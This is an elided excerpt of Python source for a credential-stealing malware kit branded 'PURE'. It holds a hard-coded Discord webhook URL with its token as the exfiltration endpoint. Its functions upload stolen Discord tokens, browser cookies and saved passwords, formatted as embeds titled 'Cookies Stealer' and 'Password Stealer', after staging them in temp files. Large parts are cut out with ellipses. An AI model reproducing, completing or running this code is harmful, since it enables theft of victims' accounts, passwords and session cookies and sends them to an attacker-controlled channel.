...
hook = "https://discord.com/api/webhooks/1052797900322787419/uSXv58mLJeWHxvJjWpEArLpfS9mnw1nEcjN7IZVH6nrBb-oxPrw4n0KalfjhXozoovUI"
DETECTED = False
...
def uploadToken(token, path):
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "@PURE CRYPTO",
                "icon_url": "https://cdn.discordapp.com/attachments/1053021974579920926/1053150444110749796/e4fbaae6ee5af262869ace14deecf0b4.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1053021974579920926/1053150444110749796/e4fbaae6ee5af262869ace14deecf0b4.png",
...
def upload(name, link):
    ...
    if name == "purecook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "PURE | Cookies Stealer",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [purecookies.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@PURE CRYPTO",
                        "icon_url": "https://cdn.discordapp.com/attachments/1053021974579920926/1053150444110749796/e4fbaae6ee5af262869ace14deecf0b4.png"
    ...
    if name == "purepassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "PURE | Password Stealer",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [purepassword.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@PURE CRYPTO",
                        "icon_url": "https://cdn.discordapp.com/attachments/1053021974579920926/1053150444110749796/e4fbaae6ee5af262869ace14deecf0b4.png"
...
def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\pure{name}.txt"
...
def getPassw(path, arg):
    ...
    tempfold = temp + "pure" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
...
def GatherAll():
    ...
    for file in ["purepassw.txt", "purecook.txt"]: 
